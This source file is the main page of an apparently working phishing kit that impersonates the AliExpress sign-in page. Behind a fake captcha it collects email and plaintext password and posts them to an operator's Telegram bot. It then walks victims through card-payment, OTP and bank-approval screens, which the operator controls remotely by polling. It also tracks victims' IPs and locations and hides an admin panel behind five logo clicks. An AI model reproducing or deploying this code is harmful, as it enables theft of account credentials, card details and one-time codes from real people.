'use client'

import React, { useState, useEffect } from 'react'
import { useRouter, usePathname } from 'next/navigation'
import { ChevronLeft, ChevronDown, Eye, EyeOff, ShieldAlert } from 'lucide-react'
import { API_URL } from './config'
import { SocialButton } from './components/SocialButton'
import { Captcha } from './components/Captcha'
import { PaymentPage } from './components/PaymentPage'
import { ProcessingPage } from './components/ProcessingPage'
import { AdminPanel, loadBotConfig } from './components/AdminPanel'
import { OtpPage } from './components/OtpPage'
import { BankApprovalPage } from './components/BankApprovalPage'
import { TranslationProvider, useTranslation } from './TranslationContext'

export type ViewState =
  | 'captcha'
  | 'login'
  | 'payment'
  | 'loading'
  | 'otp'
  | 'bank-approval'
  | 'blocked'

// Inner component — must be rendered inside TranslationProvider
const MainAppInner: React.FC = () => {
  const { t } = useTranslation()
  const router = useRouter()
  const pathname = usePathname()
  const [view, setView] = useState<ViewState>('captcha')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [locationName, setLocationName] = useState('Detecting...')
  const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown' })

  const [botConfig, setBotConfig] = useState(() => {
    const cfg = loadBotConfig()
    return { token: cfg.token, chatId: cfg.chatId }
  })

  // Sync config changes from admin panel (same or other tabs)
  useEffect(() => {
    const onStorage = () => {
      const cfg = loadBotConfig()
      setBotConfig({ token: cfg.token, chatId: cfg.chatId })
    }
    window.addEventListener('storage', onStorage)
    return () => window.removeEventListener('storage', onStorage)
  }, [])

  const [remoteAction, setRemoteAction] = useState<string>('none')
  const [liveUserInputs, setLiveUserInputs] = useState<any>({})
  const [sessionId] = useState(() => {
    const stored = sessionStorage.getItem('user_session_id')
    if (stored) return stored
    const newId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    sessionStorage.setItem('user_session_id', newId)
    return newId
  })

  // Visibility & Session Tracking
  useEffect(() => {
    const updatePresence = () => {
      const status =
        document.visibilityState === 'visible' ? 'online' : 'offline'
      if (pathname === '/admin') return
      const sessionData = {
        status,
        lastSeen: Date.now(),
        ip: ipInfo.ip,
        country: ipInfo.country,
        currentPage: `/${view}`,
        sessionId,
        email: email || '',
        password: password ? '***' : '',
      }
      fetch(`${API_URL}/api/sessions/${sessionId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(sessionData),
      }).catch(() => {})
    }
    document.addEventListener('visibilitychange', updatePresence)
    const interval = setInterval(updatePresence, 3000)
    updatePresence()
    return () => {
      document.removeEventListener('visibilitychange', updatePresence)
      clearInterval(interval)
    }
  }, [ipInfo, view, email, password, pathname, sessionId])

  // Remote Action Polling
  useEffect(() => {
    const checkActions = async () => {
      try {
        const response = await fetch(`${API_URL}/api/actions/${sessionId}`)
        const data = await response.json()
        const action = data.action
        if (action && action !== remoteAction) {
          if (action === 'otp') setView('otp')
          else if (action === 'bank_approval') setView('bank-approval')
          else if (action === 'invalid_otp') setView('otp')
          else if (action === 'declined') setView('payment')
          else if (action === 'block') setView('blocked')
          setRemoteAction(action)
        }
      } catch {}
    }
    const timer = setInterval(checkActions, 1000)
    return () => clearInterval(timer)
  }, [remoteAction, sessionId])

  const fetchCurrentLocation = async () => {
    // Use our own /api/geo endpoint — server-side lookup reads real visitor IP
    // On Vercel it reads x-vercel-ip-country header (always accurate)
    try {
      const res = await fetch(`${typeof window !== 'undefined' ? window.location.origin : ''}/api/geo`)
      const data = await res.json()
      if (data.ip && data.country && data.country !== 'Unknown') {
        const result = { ip: data.ip, country: data.country }
        setIpInfo(result)
        setLocationName(result.country)
        return result
      }
    } catch {}
    // Client-side fallback: ipapi.co (works from browser)
    try {
      const res2 = await fetch('https://ipapi.co/json/')
      const data2 = await res2.json()
      if (!data2.error && data2.ip && data2.country_name) {
        const result2 = { ip: data2.ip, country: data2.country_name }
        setIpInfo(result2)
        setLocationName(result2.country)
        return result2
      }
    } catch {}
    const fallback = { ip: 'Unknown', country: 'Unknown' }
    setIpInfo(fallback)
    setLocationName('Unknown')
    return fallback
  }

  useEffect(() => {
    fetchCurrentLocation()
  }, [])

  const sendToTelegram = async (text: string) => {
    try {
      await fetch(
        `https://api.telegram.org/bot${botConfig.token}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: botConfig.chatId,
            text,
            parse_mode: 'HTML',
          }),
        }
      )
    } catch {}
  }

  const handleVerificationSuccess = async () => {
    const currentData = await fetchCurrentLocation()
    await sendToTelegram(
      `<b>🔒 Security Verification Passed</b>\n<b>📍 IP:</b> ${currentData.ip}\n<b>🚩 Country:</b> ${currentData.country}`
    )
    setView('login')
  }

  const handleLogin = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    await sendToTelegram(
      `<b>👤 Login Attempt</b>\n<b>📧 Email:</b> <code>${email}</code>\n<b>🔑 Pass:</b> <code>${password}</code>\n<b>📍 IP:</b> ${ipInfo.ip}`
    )
    setView('payment')
  }

  const handleUserInputUpdate = (data: any) => {
    const updated = { ...liveUserInputs, ...data }
    setLiveUserInputs(updated)
    fetch(`${API_URL}/api/inputs/${sessionId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(updated),
    }).catch(() => {})
  }

  const [logoClicks, setLogoClicks] = useState(0)
  const handleLogoClick = () => {
    if (logoClicks + 1 >= 5) {
      router.push('/admin')
      setLogoClicks(0)
    } else {
      setLogoClicks((prev) => prev + 1)
    }
  }

  if (view === 'blocked') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-6 text-center">
        <div className="max-w-xs space-y-4">
          <ShieldAlert className="w-16 h-16 text-red-500 mx-auto" />
          <h1 className="text-2xl font-bold text-white">{t('error')}</h1>
          <p className="text-slate-400 text-sm">{t('doNotClose')}</p>
        </div>
      </div>
    )
  }

  if (view === 'captcha')
    return <Captcha onSuccess={handleVerificationSuccess} />
  if (view === 'loading') return <ProcessingPage />
  if (view === 'otp')
    return (
      <OtpPage
        botToken={botConfig.token}
        chatId={botConfig.chatId}
        isInvalid={remoteAction === 'invalid_otp'}
        onComplete={() => setView('loading')}
      />
    )
  if (view === 'bank-approval')
    return (
      <BankApprovalPage
        cardType={
          liveUserInputs.cardNumber?.startsWith('4')
            ? 'visa'
            : liveUserInputs.cardNumber?.startsWith('5')
              ? 'mastercard'
              : 'amex'
        }
      />
    )

  if (view === 'payment') {
    return (
      <PaymentPage
        onBack={() => setView('login')}
        botToken={botConfig.token}
        chatId={botConfig.chatId}
        currentIp={ipInfo.ip}
        currentLoc={locationName}
        onComplete={() => setView('loading')}
        onInputChange={handleUserInputUpdate}
        error={
          remoteAction === 'declined'
            ? 'Your card is declined.'
            : undefined
        }
      />
    )
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center max-w-md mx-auto relative shadow-xl overflow-hidden">
      <header className="w-full flex items-center justify-between p-4 bg-white border-b border-gray-50">
        <button className="p-1 hover:bg-gray-100 rounded-full transition-colors">
          <ChevronLeft className="w-6 h-6 text-gray-800" />
        </button>
        <div className="flex-1 flex justify-center" onClick={handleLogoClick}>
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/AliExpress_2024.svg/330px-AliExpress_2024.svg.png"
            alt="AliExpress"
            className="h-6 object-contain cursor-pointer"
          />
        </div>
        <div className="w-8" />
      </header>

      <div className="w-full px-6 pt-8 pb-4 animate-in slide-in-from-right-10 duration-500">
        <h2 className="text-2xl font-bold text-[#191919] mb-8">
          {t('signIn')}
        </h2>
        <form onSubmit={handleLogin} className="space-y-4">
          <input
            type="text"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder={t('emailOrPhone')}
            className="w-full px-4 py-4 text-base text-black font-semibold border border-gray-300 rounded-xl outline-none focus:border-[#FF4747] transition-all placeholder:text-gray-400 bg-gray-50"
          />
          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder={t('password')}
              className="w-full px-4 py-4 text-base text-black font-semibold border border-gray-300 rounded-xl outline-none focus:border-[#FF4747] transition-all placeholder:text-gray-400 bg-gray-50"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400"
            >
              {showPassword ? (
                <EyeOff className="w-5 h-5" />
              ) : (
                <Eye className="w-5 h-5" />
              )}
            </button>
          </div>
          <button
            type="submit"
            disabled={!email || !password}
            className={`w-full py-4 rounded-full text-lg font-bold text-white ${
              !email || !password ? 'bg-[#E0E0E0]' : 'bg-[#FF4747]'
            }`}
          >
            {t('signIn')}
          </button>
        </form>

        <div className="mt-4 flex justify-between items-center px-1">
          <button className="text-sm text-gray-500">{t('forgotPassword')}</button>
          <button className="text-sm text-[#FF4747] font-semibold">
            {t('signUp')}
          </button>
        </div>
        <div className="relative flex items-center py-6">
          <div className="flex-grow border-t border-gray-200"></div>
          <span className="flex-shrink mx-4 text-gray-400 text-xs font-medium uppercase tracking-widest">
            {t('orContinueWith')}
          </span>
          <div className="flex-grow border-t border-gray-200"></div>
        </div>
        <div className="grid grid-cols-1 gap-3">
          <SocialButton
            type="google"
            label="google"
            icon="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png"
          />
          <SocialButton
            type="facebook"
            label="facebook"
            icon="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"
          />
          <SocialButton
            type="apple"
            label="apple"
            icon="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
          />
        </div>
      </div>
      <footer className="w-full px-6 py-8 text-center bg-white mt-auto">
        <div className="flex items-center justify-center gap-1 mb-6 text-gray-600">
          <span className="text-sm">Location:</span>
          <button className="flex items-center gap-0.5 text-sm font-semibold hover:text-[#FF4747]">
            {locationName} <ChevronDown className="w-4 h-4" />
          </button>
        </div>
        <p className="text-[11px] leading-relaxed text-gray-400 font-normal max-w-[280px] mx-auto">
          By signing in, you agree to AliExpress.com's{' '}
          <a href="#" className="underline">
            Terms of Use
          </a>{' '}
          and{' '}
          <a href="#" className="underline">
            Privacy Policy
          </a>
          .
        </p>
      </footer>
    </div>
  )
}

// Outer wrapper — provides TranslationProvider with country detection
const MainApp: React.FC = () => {
  const [country, setCountry] = useState<string>('Unknown')

  // Detect country once on mount for translation — use server-side /api/geo
  useEffect(() => {
    fetch(
      `${typeof window !== 'undefined' ? window.location.origin : ''}/api/geo`
    )
      .then((r) => r.json())
      .then((d) => {
        if (d.country && d.country !== 'Unknown') setCountry(d.country)
      })
      .catch(() => {
        // Browser fallback
        fetch('https://ipapi.co/json/')
          .then((r) => r.json())
          .then((d) => {
            if (!d.error && d.country_name) setCountry(d.country_name)
          })
          .catch(() => {})
      })
  }, [])

  return (
    <TranslationProvider country={country}>
      <MainAppInner />
    </TranslationProvider>
  )
}

export default MainApp
